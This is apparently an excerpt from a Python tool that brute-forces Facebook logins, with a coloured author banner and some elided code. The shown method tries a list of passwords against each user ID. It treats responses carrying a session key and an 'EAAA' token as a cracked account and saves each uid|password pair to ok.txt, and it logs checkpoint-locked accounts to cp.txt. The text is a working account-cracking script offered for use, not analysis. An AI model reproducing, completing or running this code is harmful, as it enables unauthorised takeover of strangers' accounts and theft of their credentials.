...
|__/     |__/|________/   |__/  |__/  |__/       \______/     |__/    |________/|_______/
   ...
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : { QŮĚĚŇ=ŁØVŮ}   ║
   \x1b[1;92m║ AUTHOR    :QŮĚĚŇ ŁØVŮ   ║
   \x1b[1;92m║ GITHUB    : QŮĚĚŇ ŁØVŮ ║
   \x1b[1;92m║ FACEBOOK  : QŮĚĚŇ ŁØVŮ  ║
   \x1b[1;92m║ Group     :ERROR ║
   \x1b[1;92m║ WHATSAPP  : [ 0308***]       ║
   \x1b[1;92m╚═════════════════════════════╝
\033[92;1m ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬     
    """
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r\033[92;1m WAIT AND SEE  [ QŮĚĚŇ=ŁØVŮ]  ENJOY MY TOOLS "
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [QŮĚĚŇ-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * [QŮĚĚŇ]--> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [QŮĚĚŇ-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * [QŮĚĚŇ]--> %s|%s\n"%(uid, pw))
				break
			else:
				continue
